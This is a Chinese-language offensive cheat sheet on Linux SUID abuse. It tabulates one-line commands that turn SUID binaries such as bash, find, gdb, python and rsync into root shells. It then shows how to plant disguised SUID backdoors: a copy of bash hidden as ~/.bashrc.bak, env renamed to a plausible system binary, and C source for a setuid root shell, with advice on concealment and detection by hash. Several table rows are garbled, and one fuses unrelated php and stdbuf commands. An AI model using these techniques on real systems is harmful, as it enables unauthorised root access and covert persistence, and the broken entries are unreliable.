# suid提权

## suid异常命令

下面这些命令当具有s权限时将能用于提权。

```shell
chmod 6755 /bin/x
```



| 提权命令                                                     | 路径              |
| ------------------------------------------------------------ | ----------------- |
| bash -p                                                      | /usr/bin/bash     |
| csh -b                                                       | /usr/bin/csh      |
| sh -p                                                        | /usr/bin/sh       |
| ksh -p                                                       | /usr/bin/ksh      |
| zsh                                                          | /usr/bin/zsh      |
| find  /etc/passwd -exec bash -p \;                           | /usr/bin/find     |
| env  /bin/sh -p                                              | /usr/bin/env      |
| gdb -nx  -ex 'python import  os;os.execl("/bin/sh","sh","-p")' -ex quit | /usr/bin/gdb      |
| python  -c 'import os;os.execl("/bin/sh","sh","-p")'         | /usr/bin/python   |
| expect -c 'spawn /bin/sh -p; interact'                       | /usr/bin/expect   |
| xargs -a  /dev/null sh -p                                    | /usr/bin/xargs    |
| ip netns  add foo<br/>ip netns exec foo /bin/sh -p<br/># ip netns delete foo | /usr/sbin/ip      |
| strace  -o /dev/null /bin/sh -p                              | /usr/bin/strace   |
| rsync -e  'sh -p -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null   | /usr/bin/rsync    |
| setarch  $(arch) /bin/sh -p                                  | /usr/bin/setarch  |
| nice  /bin/sh -p"                                            | /usr/bin/nice     |
| CMD="/bin/sh"<br>php -r "pcntl_exec('/bin/sh', ['-p']);"stdbuf  -i0 /bin/sh -p | usr/bin/stdbuf    |
| taskset  1 /bin/sh -p                                        | /usr/bin/taskset  |
| tclsh     exec /bin/sh -p <@stdin >@stdout 2>@stderr         | /usr/bin/tclsh    |
| logsave  /dev/null /bin/sh -i -p"                            | /usr/sbin/logsave |
| ionice  /bin/sh -p                                           | /usr/bin/ionice   |

## suid后门

### 1 利用系统内suid程序的副本

隐蔽性强，成本低，特别是起了冷门但有迷惑性的程序后。缺点是散列值肯定与系统内母本散列值一样，可能被检测到。

```shell
root:
cp /usr/bin/bash ~/.bashrc.bak -a
chmod 6755  ~aplyc1a/.bashrc.bak
#.bashrc.bak即为一个suid后门
```



```shell
root:
cp /usr/bin/env /usr/bin/lshwloc
chmod 6755 /usr/bin/lshwloc
```

### 2 编译suid shell

```shell
//gcc suid.c ...; chmod 6755 ...;
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```



